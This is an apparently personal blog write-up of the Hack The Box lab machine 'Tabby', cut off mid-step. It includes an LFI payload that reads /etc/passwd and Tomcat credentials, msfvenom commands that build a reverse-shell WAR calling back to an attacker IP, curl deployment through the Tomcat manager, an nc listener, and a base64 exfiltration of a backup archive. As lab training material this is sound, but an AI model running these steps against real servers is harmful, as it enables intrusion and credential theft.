---
layout: single
title: Tabby - Hack The Box
excerpt: "Tabby is fun and easy box where have to abuse of a LFI after that of Tomcat Host manager and create a malicious war also for root abuse of the LXC"
date: 2023-01-11
classes: wide
header:
  teaser: /assets/images/htb-writeup-tabby/new.png
  teaser_home_page: true
  icon: /assets/images/hackthebox.webp
categories:
  - hackthebox
  - infosec
tags:  
  - LFI
  - LXC
  - Tomcat 
---

<p align="center">
<img src="/assets/images/htb-writeup-tabby/xd.png">
</p>

Tabby is a fun and easy box where we have to abuse of a LFI after that of Tomcat Host manager and create a malicious war for root abuse of the LXC 

## Port Scan 

```bash
Starting Nmap 7.92 ( https://nmap.org ) at 2023-01-11 15:51 CST
Nmap scan report for megahosting.htb (10.10.10.194)
Host is up (0.17s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu 4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 45:3c:34:14:35:56:23:95:d6:83:4e:26:de:c6:5b:d9 (RSA)
|   256 89:79:3a:9c:88:b0:5c:ce:4b:79:b1:02:23:4b:44:a6 (ECDSA)
|_  256 1e:e7:b9:55:dd:25:8f:72:56:e8:8e:65:d5:19:b0:8d (ED25519)
80/tcp   open  http    Apache httpd 2.4.41 ((Ubuntu))
|_http-title: Mega Hosting
|_http-server-header: Apache/2.4.41 (Ubuntu)
8080/tcp open  http    Apache Tomcat
|_http-title: Apache Tomcat
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 13.66 seconds
```
## Enumeration

Services running 

```ruby
❯ whatweb http://10.10.10.194
http://10.10.10.194 [200 OK] Apache[2.4.41], Bootstrap, Country[RESERVED][ZZ], Email[sales@megahosting.com,sales@megahosting.htb], HTML5, HTTPServer[Ubuntu Linux][Apache/2.4.41 (Ubuntu)], IP[10.10.10.194], JQuery[1.11.2], Modernizr[2.8.3-respond-1.4.2.min], Script, Title[Mega Hosting], X-UA-Compatible[IE=edge]
```

```ruby
❯ whatweb http://10.10.10.194:8080
http://10.10.10.194:8080 [200 OK] Apache-Tomcat, Country[RESERVED][ZZ], IP[10.10.10.194], Title[Apache Tomcat]
```

This is the web port 80 I goint to add to the /etc/hosts that subdomain 

![/assets/images/htb-writeup-tabby/web1.png](/assets/images/htb-writeup-tabby/web1.png)

And it works 

```bash
❯ ping -c 1 megahosting.htb
PING megahosting.htb (10.10.10.194) 56(84) bytes of data.
64 bytes from megahosting.htb (10.10.10.194): icmp_seq=1 ttl=63 time=170 ms

--- megahosting.htb ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 170.328/170.328/170.328/0.000 ms
```

This is the other web por 8080, we found a lot of information of Tomcat Service if you want you can install tomcat things but it's not necessary because in internet we can found the information we need.  

![/assets/images/htb-writeup-tabby/web2.png](/assets/images/htb-writeup-tabby/web2.png)

This is web of the subdomain

![/assets/images/htb-writeup-tabby/web3.png](/assets/images/htb-writeup-tabby/web3.png)

If you click on the button news that's look life a LFI and works

![/assets/images/htb-writeup-tabby/web4.png](/assets/images/htb-writeup-tabby/web4.png)

This are the users 

```bash
❯ curl -s -X GET "http://megahosting.htb/news.php?file=../../../../etc/passwd" | grep sh
root:x:0:0:root:/root:/bin/bash
sshd:x:111:65534::/run/sshd:/usr/sbin/nologin
ash:x:1000:1000:clive:/home/ash:/bin/bash
```

If you want to see the id_rsa of the user ash you can't but we can found information 

```bash
❯ for port in $(curl -s "http://megahosting.htb/news.php?file=../../../../proc/net/tcp" | awk '{print $2}' | grep -v "local_address" | awk '{print $2}' FS=":" | sort -u); do echo "[$port] -> Puerto $(echo "ibase=16; $port" | bc)"; done
[0016] -> Puerto 22
[0035] -> Puerto 53
[0050] -> Puerto 80
[1F90] -> Puerto 8080
[EB26] -> Puerto 60198
```

This is not entirely useful but if you install the tomcat things of we found on the web port 8080 or search in google you can find other routes of we can use in the LFI and see this in the page source code

![/assets/images/htb-writeup-tabby/web5.png](/assets/images/htb-writeup-tabby/web5.png)

New credentials

```bash
user:tomcat
password:$3cureP4s5w0rd123!
```

- [https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/](https://www.certilience.fr/2019/03/tomcat-exploit-variant-host-manager/)

we can try to connect to the host manager with the credentials

![/assets/images/htb-writeup-tabby/web6.png](/assets/images/htb-writeup-tabby/web6.png)

We have valid credentials so we can see existing applications ignore reverse because when I did the machine before I uploaded that

```bash
❯ curl -s -u'tomcat:$3cureP4s5w0rd123!' -X GET "http://10.10.10.194:8080/manager/text/list"
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/reverse:running:0:reverse
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

So can we use msfvenom to make a malicious war RCE 

```bash
❯ msfvenom -l payloads | grep java
    java/jsp_shell_bind_tcp                                            Listen for a connection and spawn a command shell
    java/jsp_shell_reverse_tcp                                         Connect back to attacker and spawn a command shell
    java/meterpreter/bind_tcp                                          Run a meterpreter server in Java. Listen for a connection
    java/meterpreter/reverse_http                                      Run a meterpreter server in Java. Tunnel communication over HTTP
    java/meterpreter/reverse_https                                     Run a meterpreter server in Java. Tunnel communication over HTTPS
    java/meterpreter/reverse_tcp                                       Run a meterpreter server in Java. Connect back stager
    java/shell/bind_tcp                                                Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Listen for a connection
    java/shell/reverse_tcp                                             Spawn a piped command shell (cmd.exe on Windows, /bin/sh everywhere else). Connect back stager
    java/shell_reverse_tcp                                             Connect back to attacker and spawn a command shell

```

Now we make the war

```bash
❯ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.21 LPORT=443 -f war -o shell.war
Payload size: 1101 bytes
Final size of war file: 1101 bytes
Saved as: shell.war
```

So if you search in google how to upload the malicious war we can use curl to upload the malicious war

```bash
❯ curl -s -u'tomcat:$3cureP4s5w0rd123!' "http://10.10.10.194:8080/manager/text/deploy?path=/shell" --upload-file shell.war
OK - Deployed application at context path [/shell]
```

It works

```bash
❯ curl -s -u'tomcat:$3cureP4s5w0rd123!' -X GET "http://10.10.10.194:8080/manager/text/list"
OK - Listed applications for virtual host [localhost]
/:running:0:ROOT
/examples:running:0:/usr/share/tomcat9-examples/examples
/reverse:running:0:reverse
/host-manager:running:1:/usr/share/tomcat9-admin/host-manager
/shell:running:0:shell
/manager:running:0:/usr/share/tomcat9-admin/manager
/docs:running:0:/usr/share/tomcat9-docs/docs
```

## Reverse Shell

Write the app of you upload and make a enter and you have the shell

![/assets/images/htb-writeup-tabby/web7.png](/assets/images/htb-writeup-tabby/web7.png)

```bash
❯ nc -lvnp 443
listening on [any] 443 ...
connect to [10.10.14.21] from (UNKNOWN) [10.10.10.194] 33060
whoami
tomcat
```

Do this after you receive the reverse shell

```bash
script /dev/null -c bash
Ctrl + Z
stty -raw -echo; fg
reset xterm
```

We can't enter to the file of ash

```bash
tomcat@tabby:/home$ ls
ash
tomcat@tabby:/home$ cd ash/
bash: cd: ash/: Permission denied
```

We foud this

```bash
tomcat@tabby:/home$ cd /var/www/html/files
tomcat@tabby:/var/www/html/files$ ls
16162020_backup.zip  archive  revoked_certs  statement
tomcat@tabby:/var/www/html/files$ file 16162020_backup.zip 
16162020_backup.zip: Zip archive data, at least v1.0 to extract
```

Now we can transfer the backup.zip in base64 copy the base64 and save in to a file 

```bash
tomcat@tabby:/var/www/html/files$ base64 -w 0 16162020_backup.zip ; echo 
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
```

We have the zip

```
❯ cat data | base64 -d | sponge data
❯ file data
data: Zip archive data, at least v1.0 to extract
❯ mv data data.zip
```

We need a password 

```bash
❯ unzip data.zip
Archive:  data.zip
   creating: var/www/html/assets/
